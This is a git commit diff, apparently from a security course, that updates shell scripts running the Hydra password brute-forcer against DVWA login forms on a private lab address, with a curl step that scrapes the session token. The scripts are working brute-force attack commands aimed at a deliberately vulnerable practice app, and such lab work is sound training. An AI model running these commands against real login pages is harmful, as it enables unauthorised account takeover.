c54cd631fbe3ae71d1b59572378b206cc92dd5d0
jerome CHAVIN <jerome.chavin@eseo.fr>
2024-04-02 16:51:22 +0200

    mise a jour hydra / wfuzz

--- data/hydra-demo.sh
+++ data/hydra-demo.sh
@@ -1,5 +1,11 @@
 . ./hydra_pre.sh
 
+$PHPSESSID="a remplir"
+
 hydra 192.168.56.71 -l admin \
    -P ./list_password.txt \
    http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=$PHPSESSID"
+
+hydra 192.168.56.71 -I -l admin \
+   -P ./liste_pass.txt -v \
+   http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${PHPSESSID}; security=low :S=Welcome to the password protected area admin"
--- data/hydra_pre.sh
+++ data/hydra_pre.sh
@@ -1,5 +1,6 @@
+# Ne pas se fier a cette version, récupérer le PHPSESSID à partir d'un navigateur Web
 # get user token
-TOKEN=$(curl -c dvwa.session -s http://192.168.56.71/dvwa/login.php | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
+TOKEN=$(curl -c dvwa.session -s http://192.168.56.71:80/dvwa/vulnerabilities/brute/ | grep 'user_token' | awk -F 'value=' '{print $2}' | cut -d"'" -f2)
 
 # get session id
 PHPSESSID=$(grep PHPSESSID dvwa.session | awk -F' ' '{print $7}')
